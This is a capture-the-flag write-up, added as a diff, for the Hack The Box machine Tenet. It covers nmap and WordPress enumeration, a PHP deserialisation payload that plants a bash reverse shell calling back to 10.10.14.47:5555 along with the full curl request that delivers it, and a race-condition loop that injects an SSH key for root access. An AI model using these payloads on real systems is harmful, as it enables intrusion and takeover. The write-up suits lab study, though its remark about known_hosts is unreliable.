@@ -1,0 +1,69 @@
+nmap -sC -sV 10.10.10.223 -sV -v
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-13 21:36 EDT
+Nmap scan report for tenet.htb (10.10.10.223)
+Host is up (0.048s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.6
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Tenet
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Found a web server running on port 80, there was a link which directs to tenet.htb.
+That suggested that we need to add that host in /etc/hosts file.
+tenet.htb was hosting a wordpress site, used wpscan to enumurate user
+Found neil and protagonist user.
+Also, there was a comment about the sator php file and the backup of it.
+
+Tried multiple things like tenet.htb/sator.php but nothing worked except 10.10.10.223/sator.php
+Also, for the backup file, did sator.php.bak which takes us to a script.
+
+
+wrote a modification of a php file to get the reverse shell
+
+""""
+class DatabaseExport {
+  public $user_file = 'rce.php';
+  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.47/5555 0>&1\'"); ?>';
+  }
+
+print urlencode(serialize(new DatabaseExport));
+""""
+run the php file.
+
+get the serialized output and pass it into the variable arepo.
+
+> curl -i http://sator.tenet.htb/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.47%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
+
+Then out listener should get a shell.
+
+After checking the wp-config, we got the password of user neil. ssh into it to get a stable shell
+
+Priv Escalation:
+checked > sudo -l
+User neil may run the following commands on tenet:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+
+What this script does is writes a id_rsa.pub key defined in key to a randomly generated file of 
+format /tmp/ssh-XXXXXXXX and then copies the contents of the file to the known_hosts of the root. 
+And then deletes the tmp file.
+
+So, if we can write our own ssh key to the tmp file before it gets copied to known_hosts, 
+our key will get written to known_hosts and we can ssh into root. So we write an infinite 
+while loop in bash that continuously writes our ssh key to any file of format /tmp/ssh-XXXXXXXX 
+using wild character. And while this runs, we run the script as sudo a number of times as we cannot 
+be sure, if the key got written before the file getting removed.
+
+"""
+while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhwQE3BL3VcaiJcQ3X6pEF841mBSpD*************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************IGnYgLXPDKmIwqC2nngvAVo7BLa+YzHy+9fuMs= root@kali" | tee /tmp/ssh* > /dev/null; done
+"""
+
+At the same time, also run 
+> sudo /usr/local/bin/enableSSH.sh
